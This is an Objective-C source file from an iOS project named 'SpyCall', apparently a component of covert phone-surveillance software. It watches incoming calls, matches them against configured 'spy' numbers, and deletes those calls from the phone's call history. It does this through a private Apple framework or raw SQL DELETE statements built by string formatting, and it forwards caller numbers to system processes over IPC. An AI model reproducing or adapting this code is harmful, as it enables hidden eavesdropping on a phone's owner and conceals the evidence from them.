//
//  RecentCallNotifier.m
//  SpyCall
//
//  Created by Makara Khloth on 3/14/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import "RecentCallNotifier.h"
#import "TelephonyNotificationManagerImpl.h"
#import "MessagePortIPCSender.h"

#import "PreferenceManager.h"
#import "Preference.h"
#import "PrefMonitorNumber.h"

#import "DefStd.h"
#import "FMDatabase.h"
//#import "CTCall.h"
#import "Telephony.h"
#import "TelephoneNumber.h"
#import "CTCall.h"

#import "CHManager.h"
#import "CHRecentCall.h"
#import "CHPhoneNumber.h"

#import <UIKit/UIKit.h>
#import <dlfcn.h>
#import <objc/runtime.h>
#import <CoreTelephony/CTTelephonyNetworkInfo.h>
#import <CoreTelephony/CTCarrier.h>

@interface RecentCallNotifier (private)

- (void) startNotification;
- (void) stopNotifcation;
- (void) main;

- (BOOL) isFaceTimeCall: (CTCall *) aCall;
- (void) recentCallAdded: (id) aNotification;
- (void) callStatusChanged: (id) aNotification;

- (void) deleteCallFromCallDatabase: (CTCall *) aCall;
- (NSString *) telephoneNumber: (CTCall *) aCall;
- (BOOL) isSpyNumber: (NSString *) aTelephoneNumber;

@end

@implementation RecentCallNotifier

@synthesize mPreferenceManager;
@synthesize mIsListening;

- (id) init {
	if ((self = [super init])) {
        
	}
	return (self);
}

- (void) start {
	if (![self mIsListening]) {
		[self startNotification];
		[self setMIsListening:YES];
	}
}

- (void) stop {
	if ([self mIsListening]) {
		[self stopNotifcation];
		[self setMIsListening:NO];
	}
}

- (BOOL) isSpyCall: (CTCall *) aCall {
	return (!CTCallIsOutgoing(aCall) && [self isSpyNumber:[self telephoneNumber:aCall]]);
}

- (void) startNotification {
	mRecentCallNotificationThread = [[NSThread alloc] initWithTarget:self selector:@selector(main) object:nil];
	[mRecentCallNotificationThread start];
}

- (void) stopNotifcation {
	[mRecentCallNotificationThread cancel];
	if (mRecentCallNotificationRL) {
		CFRunLoopRef rl = [mRecentCallNotificationRL getCFRunLoop];
		CFRunLoopStop(rl);
		mRecentCallNotificationRL = nil;
	}
	[mRecentCallNotificationThread release];
	mRecentCallNotificationThread = nil;
}

- (void) main {
	NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
	RecentCallNotifier *this = self;
	[this retain];
	mRecentCallNotificationRL = [NSRunLoop currentRunLoop];
	DLog (@"Telephone number helper thread, is main thread = %@, %d", [NSThread currentThread], [[NSThread currentThread] isMainThread]);
    
	@try {
		TelephonyNotificationManagerImpl* telephonyImpl = [[TelephonyNotificationManagerImpl alloc] init];
		[telephonyImpl startListeningToTelephonyNotifications];
        
        // iOS 7 downward
		[telephonyImpl addNotificationListener:self withSelector:@selector(recentCallAdded:)
							   forNotification:KCALLHISTORYRECORDADDNOTIFICATION];
        
		[telephonyImpl addNotificationListener:self withSelector:@selector(callStatusChanged:)
							   forNotification:KCALLSTATUSCHANGENOTIFICATION];
        
		while (![[NSThread currentThread] isCancelled]) {
			DLog (@"While loop enter ....");
			// Create run loop source
			NSTimer *t = [NSTimer scheduledTimerWithTimeInterval:3600
														  target:nil
														selector:nil
														userInfo:nil
														 repeats:NO];
			CFRunLoopRunInMode(kCFRunLoopDefaultMode, 3600, YES);
			t = nil;
			DLog (@"While loop exit ....");
		};
        
		[telephonyImpl removeListner:self withName:KCALLSTATUSCHANGENOTIFICATION];
        [telephonyImpl removeListner:self withName:KCALLHISTORYRECORDADDNOTIFICATION];
		[telephonyImpl stopListeningToTelephonyNotifications];
		[telephonyImpl release];
		telephonyImpl = nil;
	}
	@catch (NSException * e) {
		;
	}
	@finally {
		;
	}
	[this release];
	[pool release];
	DLog(@"======== PICKER THREAD EXIT ========");
}

// This is to check if it is FaceTime call or Phone call
- (BOOL) isFaceTimeCall: (CTCall *) aCall {
    BOOL isFaceTimeCall     = NO;
    CTCallType callType     = kCTCallTypeNormal;
    callType                = (CTCallType)CTCallGetCallType(aCall);			// Get Call type
    DLog (@"--> callType %@", callType)
    isFaceTimeCall          = [(NSString *) callType isEqualToString:(NSString *) kCTCallTypeVideoConference]       ||
    [(NSString *) callType isEqualToString:(NSString *) @"kCTCallTypeAudioConference"];
    return isFaceTimeCall;
}

- (void) recentCallAdded: (id) aNotification {
	DLog(@"recentCallAdded >>>>>>, is main thread: %@, %d", [NSThread currentThread], [[NSThread currentThread] isMainThread]);
    DLog(@"aNotification >>>>>> %@", aNotification);
	NSNotification *notification = aNotification;
	NSDictionary *userInfo = [notification userInfo];
	CTCall *call = (CTCall *)[userInfo objectForKey:@"kCTCall"];
    
    // Delete all spy call number regardless of direction for call history
	if (![self isFaceTimeCall:call]     &&  // it is Not FaceTime call
        [self isSpyCall:call])          {   // it is Monitor Number
		[self deleteCallFromCallDatabase:call];
	}
}

- (void) callStatusChanged: (id) aNotification {
	DLog(@"callStatusChanged >>>>>>, is main thread: %@, %d", [NSThread currentThread], [[NSThread currentThread] isMainThread]);
	NSNotification *notification = aNotification;
	NSDictionary *userInfo = [notification userInfo];
	NSInteger status = [[userInfo objectForKey:@"kCTCallStatus"] intValue];
	if (status == CALL_NOTIFICATION_STATUS_INCOMING) {
		CTCall *call = (CTCall *)[userInfo objectForKey:@"kCTCall"];
		NSString *telephoneNumber = [self telephoneNumber:call];
		
		// SpringBoard
		MessagePortIPCSender *sender = [[MessagePortIPCSender alloc] initWithPortName:kSpyCallPhoneNumberPickerMsgPort1];
		[sender writeDataToPort:[telephoneNumber dataUsingEncoding:NSUTF8StringEncoding]];
		[sender release];
		sender = nil;
		
		// Mobile phone
		sender = [[MessagePortIPCSender alloc] initWithPortName:kSpyCallPhoneNumberPickerMsgPort2];
		[sender writeDataToPort:[telephoneNumber dataUsingEncoding:NSUTF8StringEncoding]];
		[sender release];
	}
    
    // iOS 8, to delete call log of spy call because KCALLHISTORYRECORDADDNOTIFICATION no longer call
    if ([[[UIDevice currentDevice] systemVersion] intValue] >= 8) {
        if (status == CALL_NOTIFICATION_STATUS_TERMINATED) {
            [self performSelector:@selector(recentCallAdded:)
                       withObject:aNotification
                       afterDelay:3.5];
        }
    }
}

- (void) deleteCallFromCallDatabase: (CTCall *) aCall {
    NSString *sqlStatement = nil;
	FMDatabase *callDatabase = nil;
    
    if ([[[UIDevice currentDevice] systemVersion] integerValue] >= 9) {
        void *handle = dlopen("/System/Library/PrivateFrameworks/CallHistory.framework/CallHistory", RTLD_NOW);
        
        NSString *telephoneNumber = [self telephoneNumber:aCall];
        CTTelephonyNetworkInfo *networkInfo = [[CTTelephonyNetworkInfo alloc] init];
        CTCarrier *carrier = networkInfo.subscriberCellularProvider;
        Class $CHPhoneNumber = objc_getClass("CHPhoneNumber");
        CHPhoneNumber *phoneNumber =  [[$CHPhoneNumber alloc] initWithPhoneNumber:telephoneNumber andISOCountryCode:carrier.isoCountryCode];
        NSString *formattedNumber = [phoneNumber formattedNumber];
        DLog(@"telephoneNumber: %@, formattedNumber: %@", telephoneNumber, formattedNumber);
        
        Class $CHManager = objc_getClass("CHManager");
        CHManager *manager = [[$CHManager alloc] init];
        NSArray *recentCalls = [manager recentCallsWithPredicate:[NSPredicate predicateWithFormat:@"callerId like[cd] %@", formattedNumber]];
        //NSArray *recentCalls = [manager recentCalls];
        DLog(@"recentCalls, %@", recentCalls);
        DLog(@"postFetchingPredicate, %@", [manager postFetchingPredicate]);
        for (CHRecentCall *recentCall in recentCalls) {
            [manager deleteCall:recentCall];
        }
        [manager release];
        
        [networkInfo release];
        
        dlclose(handle);
    } else if ([[[UIDevice currentDevice] systemVersion] intValue] >= 8) {
        callDatabase = [FMDatabase databaseWithPath:kCallHistoryDatabasePathiOS8];
        sqlStatement = [NSString stringWithFormat:@"DELETE FROM ZCALLRECORD WHERE ZADDRESS = '%@'", [self telephoneNumber:aCall]];
    } else {
        callDatabase = [FMDatabase databaseWithPath:kCallHistoryDatabasePath];
        sqlStatement = [NSString stringWithFormat:@"DELETE FROM call WHERE address = '%@'", [self telephoneNumber:aCall]];
    }
	[callDatabase open];
	[callDatabase executeUpdate:sqlStatement];
	DLog(@"Call database last error code = %d, message = %@", [callDatabase lastErrorCode], [callDatabase lastErrorMessage])
	[callDatabase close];
}

- (NSString *) telephoneNumber: (CTCall *) aCall {
	NSString *telephoneNumber = CTCallCopyAddress(nil, aCall);
	[telephoneNumber autorelease];
	return (telephoneNumber);
}

- (BOOL) isSpyNumber: (NSString *) aTelephoneNumber {
	DLog(@"isSpyNumber %@ >>>>>>", aTelephoneNumber);
	BOOL yes = NO;
	PrefMonitorNumber *prefMonitorNumbers = (PrefMonitorNumber *)[[self mPreferenceManager] preference:kMonitor_Number];
	if ([prefMonitorNumbers mEnableMonitor]) {
		TelephoneNumber *telNumber = [[TelephoneNumber alloc] init];
		for (NSString *monitorNumber in [prefMonitorNumbers mMonitorNumbers]) {
			if ([telNumber isNumber:aTelephoneNumber matchWithMonitorNumber:monitorNumber]) {
				yes = YES;
				break;
			}
		}
		[telNumber release];
	}
	return (yes);
}

- (void) dealloc {
    [self stop];
	[super dealloc];
}

@end
